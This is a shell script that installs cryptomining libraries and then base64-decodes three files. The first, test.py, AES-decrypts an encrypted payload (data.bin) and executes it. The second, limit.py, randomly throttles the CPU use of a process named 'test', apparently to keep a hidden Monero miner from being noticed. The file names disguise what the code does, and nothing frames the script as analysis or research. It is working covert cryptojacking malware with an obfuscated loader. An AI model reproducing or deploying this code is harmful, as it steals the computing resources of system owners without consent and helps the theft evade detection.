sudo apt install -y python3-pip cpulimit build-essential libssl-dev cmake
pip3 install requests psutil PyCryptodome py-cryptonight>=0.2.4 git+https://github.com/jtgrassie/pyrx.git#egg=pyrx
echo 'aW1wb3J0IGJhc2U2NAppbXBvcnQgaGFzaGxpYgppbXBvcnQgc3lzCmltcG9ydCBvcwpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUwpmcm9tIENyeXB0by5VdGlsLlBhZGRpbmcgaW1wb3J0IHBhZCwgdW5wYWQKaW1wb3J0IHNvY2tldAppbXBvcnQgc2VsZWN0CmltcG9ydCBiaW5hc2NpaQppbXBvcnQgcHljcnlwdG9uaWdodAppbXBvcnQgcHlyeAppbXBvcnQgc3RydWN0CmltcG9ydCBqc29uCmltcG9ydCB0aW1lCmltcG9ydCByYW5kb20KaW1wb3J0IHJlcXVlc3RzCmZyb20gbXVsdGlwcm9jZXNzaW5nIGltcG9ydCBQcm9jZXNzLCBRdWV1ZQoKS0VZID0gaGFzaGxpYi5zaGEyNTYoInRoaXNpc2FrZXkiLmVuY29kZSgpKS5kaWdlc3QoKQpERUJVRyA9IEZhbHNlCiAgICAgICAgCmRlZiBtYWluKCk6CiAgICBpZiBsZW4oc3lzLmFyZ3YpIDwgMjoKICAgICAgICBwcmludCgiVVNBR0U6IHRlc3QucHkgPGRhdGE+IikKICAgICAgICByZXR1cm4KICAgIHRlc3RfcGF0aCA9IHN5cy5hcmd2WzFdCiAgICBpZiBub3Qgb3MucGF0aC5leGlzdHModGVzdF9wYXRoKToKICAgICAgICBwcmludCgiQ2Fubm90IGZpbmQgdGVzdCBleGVjdXRhYmxlIikKICAgICAgICByZXR1cm4KICAgIGFlc0NpcGhlciA9IEFFUy5uZXcoS0VZLCBBRVMuTU9ERV9FQ0IpCiAgICBkYXRhID0gb3Blbih0ZXN0X3BhdGgsICJyYiIpLnJlYWQoKQogICAgY29kZSA9IHVucGFkKGFlc0NpcGhlci5kZWNyeXB0KGRhdGEpLCAxNikKICAgIGV4ZWMoY29kZSkKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICBtYWluKCkKCg==' | base64 --decode > ./test.py
echo 'aW1wb3J0IHN1YnByb2Nlc3MNCmltcG9ydCBzeXMNCmltcG9ydCBvcw0KaW1wb3J0IHJhbmRvbQ0KaW1wb3J0IHRpbWUNCmltcG9ydCBzaWduYWwNCmltcG9ydCBwc3V0aWwNCmltcG9ydCBzeXMNCg0KTUlOX1RJTUVPVVQgPSAxMA0KTUFYX1RJTUVPVVQgPSAzMA0KTUlOX0NQVSA9IDUNCk1BWF9DUFUgPSA4MA0KQ0hFQ0tfU0xFRVAgPSA1DQoNCmRlZiBnZXRQaWRCeU5hbWUocHJvY2Vzc05hbWUpOg0KICAgICcnJw0KICAgIENoZWNrIGlmIHRoZXJlIGlzIGFueSBydW5uaW5nIHByb2Nlc3MgdGhhdCBjb250YWlucyB0aGUgZ2l2ZW4gbmFtZSBwcm9jZXNzTmFtZS4NCiAgICAnJycNCiAgICAjSXRlcmF0ZSBvdmVyIHRoZSBhbGwgdGhlIHJ1bm5pbmcgcHJvY2Vzcw0KICAgIGZvciBwcm9jIGluIHBzdXRpbC5wcm9jZXNzX2l0ZXIoKToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgIyBDaGVjayBpZiBwcm9jZXNzIG5hbWUgY29udGFpbnMgdGhlIGdpdmVuIG5hbWUgc3RyaW5nLg0KICAgICAgICAgICAgaWYgcHJvY2Vzc05hbWUubG93ZXIoKSBpbiBwcm9jLm5hbWUoKS5sb3dlcigpOg0KICAgICAgICAgICAgICAgIHJldHVybiBwcm9jDQogICAgICAgIGV4Y2VwdCAocHN1dGlsLk5vU3VjaFByb2Nlc3MsIHBzdXRpbC5BY2Nlc3NEZW5pZWQsIHBzdXRpbC5ab21iaWVQcm9jZXNzKToNCiAgICAgICAgICAgIHBhc3MNCiAgICByZXR1cm4gTm9uZQ0KDQpkZWYgcnVuKCk6DQogICAgcmFuZG9tLnNlZWQoKQ0KICAgIHAgPSBOb25lDQogICAgd2hpbGUgVHJ1ZToNCiAgICAgICAgdHJ5Og0KICAgICAgICAgICAgeG1yaWdfcHJvYyA9IE5vbmUNCiAgICAgICAgICAgIGlmIGxlbihzeXMuYXJndikgPiAxOg0KICAgICAgICAgICAgICAgIHBpZCA9IHN5cy5hcmd2WzFdDQogICAgICAgICAgICAgICAgdHJ5Og0KICAgICAgICAgICAgICAgICAgICAjIENoZWNrIGlmIHByb2Nlc3MgbmFtZSBjb250YWlucyB0aGUgZ2l2ZW4gbmFtZSBzdHJpbmcuDQogICAgICAgICAgICAgICAgICAgIHhtcmlnX3Byb2MgPSBwc3V0aWwuUHJvY2VzcyhpbnQocGlkKSkNCiAgICAgICAgICAgICAgICBleGNlcHQgKHBzdXRpbC5Ob1N1Y2hQcm9jZXNzLCBwc3V0aWwuQWNjZXNzRGVuaWVkLCBwc3V0aWwuWm9tYmllUHJvY2Vzcyk6DQogICAgICAgICAgICAgICAgICAgIHhtcmlnX3Byb2MgPSBnZXRQaWRCeU5hbWUoInRlc3QiKQ0KICAgICAgICAgICAgZWxzZToNCiAgICAgICAgICAgICAgICB4bXJpZ19wcm9jID0gZ2V0UGlkQnlOYW1lKCJ0ZXN0IikNCiAgICAgICAgICAgIGlmIHhtcmlnX3Byb2MgaXMgTm9uZToNCiAgICAgICAgICAgICAgICBwcmludCgiUHJvY2VzcyBpc24ndCBmb3VuZCIpDQogICAgICAgICAgICAgICAgdGltZS5zbGVlcChDSEVDS19TTEVFUCkNCiAgICAgICAgICAgICAgICBjb250aW51ZQ0KICAgICAgICAgICAgdGltZW91dCA9IHJhbmRvbS5yYW5kcmFuZ2UoTUlOX1RJTUVPVVQsIE1BWF9USU1FT1VUICsgMSkNCiAgICAgICAgICAgIGNwdV9saW1pdCA9IHJhbmRvbS5yYW5kcmFuZ2UoTUlOX0NQVSwgTUFYX0NQVSArIDEpDQogICAgICAgICAgICBwcmludCgiTGltaXRpbmcgQ1BVIHRvICVkIGZvciAlZCBzZWNvbmRzIiAlKGNwdV9saW1pdCwgdGltZW91dCkpDQogICAgICAgICAgICBwID0gc3VicHJvY2Vzcy5Qb3BlbihbImNwdWxpbWl0IiwgIi1wIiwgc3RyKHhtcmlnX3Byb2MucGlkKSwgIi1sIiwgc3RyKGNwdV9saW1pdCldLCBzdGRvdXQ9c3VicHJvY2Vzcy5ERVZOVUxMLCBzdGRlcnI9c3VicHJvY2Vzcy5ERVZOVUxMKQ0KICAgICAgICAgICAgdGltZS5zbGVlcCh0aW1lb3V0KQ0KICAgICAgICAgICAgcC5zZW5kX3NpZ25hbChzaWduYWwuU0lHSU5UKQ0KICAgICAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6DQogICAgICAgICAgICBwLnNlbmRfc2lnbmFsKHNpZ25hbC5TSUdJTlQpDQogICAgICAgICAgICBicmVhaw0KICAgICAgICB0cnk6DQogICAgICAgICAgICBwLndhaXQodGltZW91dD01KQ0KICAgICAgICAgICAgcHJpbnQoIj8/PyBQcm9jZXNzIHRlcm1pbmF0ZWQiKQ0KICAgICAgICAgICAgcC50ZXJtaW5hdGUoKQ0KICAgICAgICBleGNlcHQgc3VicHJvY2Vzcy5UaW1lb3V0RXhwaXJlZDoNCiAgICAgICAgICAgIGlmIHAucmV0dXJuY29kZSBpcyBOb25lOg0KICAgICAgICAgICAgICAgIHByaW50KCIhISEgUHJvY2VzcyBpcyBzdGlsbCBhbGl2ZSIpDQogICAgICAgICAgICAgICAgcC50ZXJtaW5hdGUoKQ0KICAgICAgICANCmRlZiBtYWluKCk6DQogICAgcnVuKCkNCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6DQogICAgbWFpbigpDQo=' | base64 --decode > ./limit.py
echo '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' | base64 --decode > ./data.bin
echo 'python3 ./limit.py'
echo 'python3 ./test.py ./data.bin'
